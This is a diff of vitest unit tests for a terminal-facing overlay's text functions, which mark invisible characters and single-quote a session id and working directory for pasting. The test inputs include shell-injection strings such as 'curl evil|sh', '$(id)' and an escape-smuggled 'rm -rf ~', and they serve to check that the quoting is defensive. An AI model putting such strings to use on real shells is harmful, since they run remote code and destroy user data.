@@ -1,5 +1,9 @@
 import { describe, expect, it } from "vitest";
-import { formatWaiting, visibleControls } from "../../../src/overlays/action-card/format.ts";
+import {
+  copyOnlyText,
+  formatWaiting,
+  visibleControls,
+} from "../../../src/overlays/action-card/format.ts";
 
 // M4.07: "how long" on the card. `formatWaiting(ms)` takes the elapsed milliseconds
 // (store clock minus the attention record's `since`) and returns a short whole-second label.
@@ -100,5 +104,100 @@ describe("visibleControls", () => {
 
   it("returns an empty string unchanged", () => {
     expect(visibleControls("")).toBe("");
+  });
+});
+
+// M4.17 L2: default-ignorable code points and non-ASCII spaces hide or fake text too, so they get
+// the same visible `<U+XXXX>` marker. Ordinary ASCII space and letters stay as they are.
+describe("visibleControls: default-ignorables and non-ASCII spaces (M4.17 L2)", () => {
+  const marker = (code: number) => `<U+${code.toString(16).toUpperCase().padStart(4, "0")}>`;
+  const codes = [
+    0x115f, 0x1160, 0x17b4, 0x17b5, 0x180b, 0x180c, 0x180d, 0x180f, 0xe0100, 0xe01ef, 0x00a0,
+    0x1680, 0x2000, 0x2001, 0x2005, 0x200a, 0x202f, 0x205f, 0x3000, 0x2800,
+  ];
+
+  it.each(codes.map((code) => [marker(code), code] as const))("marks %s", (_label, code) => {
+    expect(visibleControls(`a${String.fromCodePoint(code)}b`)).toBe(`a${marker(code)}b`);
+  });
+
+  it("leaves an ordinary ASCII space and letters unchanged", () => {
+    expect(visibleControls("ls -la /tmp/my dir")).toBe("ls -la /tmp/my dir");
+  });
+});
+
+// M4.17 M1: the Open session copy-only text is pasted into a terminal, and the recorded cwd is free
+// text. Each value is POSIX single-quoted (a `'` becomes `'\''`), one per line:
+//   session '<id>'
+//   cwd '<path>'      (only when there is a cwd)
+// Control and invisible characters are still removed first.
+describe("copyOnlyText (M4.17 M1)", () => {
+  const Q = "'\\''"; // the four characters that stand for one single quote inside quotes
+
+  it("puts the session id and the working directory on two single-quoted lines", () => {
+    expect(copyOnlyText({ sessionId: "sess-1", cwd: "/work/app" })).toBe(
+      "session 'sess-1'\ncwd '/work/app'",
+    );
+  });
+
+  it("has only the session line when there is no working directory", () => {
+    expect(copyOnlyText({ sessionId: "sess-1" })).toBe("session 'sess-1'");
+    expect(copyOnlyText({ sessionId: "sess-1", cwd: undefined })).toBe("session 'sess-1'");
+  });
+
+  it.each([
+    ["a semicolon command", "/p/a;touch x", "'/p/a;touch x'"],
+    ["a command substitution", "/p/$(id)", "'/p/$(id)'"],
+    ["a backtick command", "/p/`id`", "'/p/`id`'"],
+    ["a pipe", "/proj/x;curl evil|sh", "'/proj/x;curl evil|sh'"],
+    ["a single quote", "a'b", `'a${Q}b'`],
+    ["two single quotes in a row", "a''b", `'a${Q}${Q}b'`],
+    ["a space", "a b", "'a b'"],
+    ["a double quote and a backslash", 'a"b\\c', `'a"b\\c'`],
+  ])("quotes a cwd with %s", (_name, cwd, quoted) => {
+    expect(copyOnlyText({ sessionId: "sess-1", cwd })).toBe(`session 'sess-1'\ncwd ${quoted}`);
+  });
+
+  it("quotes the session id the same way", () => {
+    expect(copyOnlyText({ sessionId: "s'1;id" })).toBe(`session 's${Q}1;id'`);
+  });
+
+  it("still removes control characters, so the text never gains a line", () => {
+    const copied = copyOnlyText({
+      sessionId: "sess-1",
+      cwd: "/work/app\u001b]0;x\u0007\nrm -rf ~\r",
+    });
+    expect(copied.split("\n")).toHaveLength(2);
+    expect(copied).not.toContain("\u001b");
+    expect(copied).not.toContain("\u0007");
+    expect(copied).not.toContain("\r");
+  });
+});
+
+// M4.17 roborev 6355: the card marks non-ASCII spaces, but a copied cwd must keep them, because
+// they can be real characters of the path and the copied text is quoted anyway.
+describe("copyOnlyText keeps non-ASCII spaces (M4.17 roborev 6355)", () => {
+  it("keeps a no-break space inside the single quotes", () => {
+    expect(copyOnlyText({ sessionId: "s", cwd: "/p/a\u00a0b" })).toBe(
+      "session 's'\ncwd '/p/a\u00a0b'",
+    );
+  });
+
+  it("shows the same no-break space as a marker on the card", () => {
+    expect(visibleControls("/p/a\u00a0b")).toBe("/p/a<U+00A0>b");
+  });
+
+  it.each([0x00a0, 0x1680, 0x2000, 0x2005, 0x200a, 0x202f, 0x205f, 0x3000, 0x2800])(
+    "keeps space code point %i in the copied cwd",
+    (code) => {
+      const space = String.fromCodePoint(code);
+      expect(copyOnlyText({ sessionId: "s", cwd: `/p/a${space}b` })).toBe(
+        `session 's'\ncwd '/p/a${space}b'`,
+      );
+    },
+  );
+
+  it("still strips real control and bidi characters next to a kept space", () => {
+    const copied = copyOnlyText({ sessionId: "s", cwd: "/p/a\u00a0\u0007b\u202ec" });
+    expect(copied).toBe("session 's'\ncwd '/p/a\u00a0bc'");
   });
 });
